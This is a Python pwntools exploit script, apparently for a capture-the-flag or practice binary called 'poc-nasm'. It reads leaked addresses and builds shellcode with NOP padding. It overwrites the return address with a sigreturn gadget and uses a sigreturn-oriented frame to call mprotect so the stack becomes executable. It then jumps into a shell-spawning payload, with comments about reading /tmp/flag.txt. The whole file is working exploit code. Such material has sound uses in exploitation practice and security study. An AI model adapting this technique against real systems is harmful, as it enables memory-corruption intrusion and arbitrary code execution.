import os

from pwn import *
PAGE_SIZE = 4096
context.clear(arch="i386", kernel="amd64")

def main():
	e = ELF("poc-nasm")
	p = process("poc-nasm")

	## Return addr at 0x100
	# 1) Spawn a shell
	# 2) Read file at "/tmp/flag.txt"

	pop_esp = unpack(p.recvn(4))
	pop_eax = pop_esp+2
	syscall_sigreturn = pop_esp+4
	syscall_addr = pop_esp + 9
	stack_pivot = pop_esp + 12			# add esp,0x10; ret
	open_addr = pop_esp - 0x14

	buff_addr = unpack(p.recvn(4))-4
	base_addr = buff_addr & ~(PAGE_SIZE - 1)

	shk2 = asm(shellcraft.dupsh())

	shk = b""
	shk += shk2
	shk += b"\x90" * (0x104 - len(shk2))

	shk += pack(syscall_sigreturn)

	frame = SigreturnFrame()
	frame.eax = constants.linux.i386.SYS_mprotect
	# Arguments: start; len; prot
	frame.ebx = base_addr
	frame.ecx = PAGE_SIZE
	frame.edx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC

	frame.eip = syscall_addr
	frame.esp = buff_addr+len(shk)+len(frame)
	frame.ebp = base_addr

	shk += bytes(frame)
	shk += pack(buff_addr)    # return to shellcode after mprotect syscall

	p.send(shk)
	p.interactive()





main()